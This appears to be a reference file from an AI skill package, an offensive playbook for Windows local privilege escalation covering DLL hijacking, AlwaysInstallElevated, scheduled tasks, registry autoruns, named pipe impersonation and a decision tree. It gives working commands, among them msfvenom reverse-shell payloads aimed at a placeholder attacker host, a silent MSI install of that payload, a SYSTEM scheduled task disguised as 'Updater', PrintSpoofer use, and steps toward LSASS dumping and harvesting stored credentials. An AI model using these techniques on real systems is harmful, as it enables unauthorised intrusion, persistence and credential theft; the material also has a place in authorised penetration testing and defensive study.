# SKILL: Windows Local Privilege Escalation — Expert Attack Playbook: detailed technique reference

<!-- zhiyugo:resource:start -->
> ZhiyuGo reference material only. Inspect it explicitly through catalog resource tooling when the main Skill names this file; examples do not grant tools, authorization, or evidence.
<!-- zhiyugo:resource:end -->

<!-- zhiyugo:toc:start -->
## Contents

- [4. DLL HIJACKING](#4-dll-hijacking)
- [5. ALWAYSINSTALLELEVATED](#5-alwaysinstallelevated)
- [6. SCHEDULED TASK ABUSE](#6-scheduled-task-abuse)
- [7. REGISTRY AUTORUNS](#7-registry-autoruns)
- [8. NAMED PIPE IMPERSONATION](#8-named-pipe-impersonation)
- [9. AUTOMATED TOOLS](#9-automated-tools)
- [10. PRIVILEGE ESCALATION DECISION TREE](#10-privilege-escalation-decision-tree)
<!-- zhiyugo:toc:end -->

## 4. DLL HIJACKING

### DLL Search Order (Standard)

1. Directory of the executable
2. `C:\Windows\System32`
3. `C:\Windows\System`
4. `C:\Windows`
5. Current directory
6. Directories in `%PATH%`

### Exploitation

```cmd
# Find missing DLLs (use Process Monitor)
# Filter: Result=NAME NOT FOUND, Path ends with .dll

# Compile malicious DLL
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f dll > evil.dll

# Place in writable directory that comes before the real DLL location
```

### Known Phantom DLL Targets

| Application | Missing DLL | Drop Location |
|---|---|---|
| Various .NET apps | `profapi.dll` | Application directory |
| Windows services | `wlbsctrl.dll` | `%PATH%` writable dir |
| Third-party updaters | `VERSION.dll` | Application directory |

---

## 5. ALWAYSINSTALLELEVATED

```cmd
# Check both registry keys — BOTH must be set to 1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```cmd
# Generate MSI payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi > evil.msi
msiexec /quiet /qn /i evil.msi
```

---

## 6. SCHEDULED TASK ABUSE

```cmd
# Enumerate tasks with writable scripts or missing binaries
schtasks /query /fo LIST /v | findstr /i "Task To Run\|Run As User\|Schedule Type"

# Check permissions on task binary
icacls "C:\path\to\task\binary.exe"

# If writable: replace binary, wait for task execution
# If missing: place your binary at the expected path
```

### Scheduled Task via PowerShell

```powershell
# If you can create tasks (unlikely from low priv, useful post-UAC-bypass)
$action = New-ScheduledTaskAction -Execute "C:\temp\rev.exe"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName "Updater" -Action $action -Trigger $trigger -User "SYSTEM"
```

---

## 7. REGISTRY AUTORUNS

```cmd
# Check writable autorun locations
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Check permissions with accesschk
accesschk64.exe -wvu "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /accepteula
```

If an autorun entry points to a writable path → replace binary or inject new entry.

---

## 8. NAMED PIPE IMPERSONATION

```powershell
# Service account creates a named pipe, tricks a SYSTEM process into connecting
# The connecting client's token is then impersonated

# PrintSpoofer leverages this with the Print Spooler:
PrintSpoofer64.exe -i -c powershell.exe
```

Custom named pipe server (requires SeImpersonatePrivilege):
```powershell
# Create pipe → coerce SYSTEM connection → ImpersonateNamedPipeClient() → SYSTEM token
```

---

## 9. AUTOMATED TOOLS

| Tool | Purpose | Command |
|---|---|---|
| **winPEAS** | Comprehensive Windows enumeration | `winPEASx64.exe` |
| **PowerUp** | Service/DLL/registry misconfig checks | `Invoke-AllChecks` |
| **Seatbelt** | Security-focused host survey | `Seatbelt.exe -group=all` |
| **SharpUp** | C# port of PowerUp checks | `SharpUp.exe audit` |
| **PrivescCheck** | PowerShell privesc checker | `Invoke-PrivescCheck` |
| **BeRoot** | Common misconfig finder | `beRoot.exe` |

---

## 10. PRIVILEGE ESCALATION DECISION TREE

```
Low-privilege shell on Windows
│
├── whoami /priv → SeImpersonatePrivilege?
│   ├── Yes → Potato family (§2)
│   │   ├── Server2019+/Win11 → GodPotato or PrintSpoofer
│   │   ├── Server2016/Win10 → PrintSpoofer or SweetPotato
│   │   └── Older → JuicyPotato (need CLSID)
│   └── SeDebugPrivilege? → LSASS dump / process injection
│
├── Service misconfigurations?
│   ├── Unquoted path with spaces + writable dir? → binary plant (§3)
│   ├── SERVICE_CHANGE_CONFIG on service? → reconfigure binpath (§3)
│   └── Writable service binary? → replace executable (§3)
│
├── DLL hijacking opportunity?
│   ├── Missing DLL in search path? → plant malicious DLL (§4)
│   └── Writable directory in %PATH%? → DLL plant (§4)
│
├── AlwaysInstallElevated set?
│   └── Both HKLM+HKCU = 1 → MSI payload (§5)
│
├── Scheduled task abuse?
│   ├── Task runs as SYSTEM with writable binary? → replace (§6)
│   └── Task references missing binary? → plant binary (§6)
│
├── Registry autorun writable?
│   └── Writable binary path → replace on next login/reboot (§7)
│
├── UAC bypass needed? (medium integrity → high integrity)
│   └── Load UAC_BYPASS_METHODS.md
│
├── Stored credentials?
│   ├── cmdkey /list → runas /savecred
│   ├── Autologon in registry? → plaintext creds
│   └── WiFi passwords, browser creds, DPAPI
│
└── None of the above?
    ├── Run winPEAS for comprehensive scan
    ├── Check internal services (netstat -ano)
    ├── Look for sensitive files (unattend.xml, web.config, *.config)
    └── Check for kernel exploits (systeminfo → Windows Exploit Suggester)
```
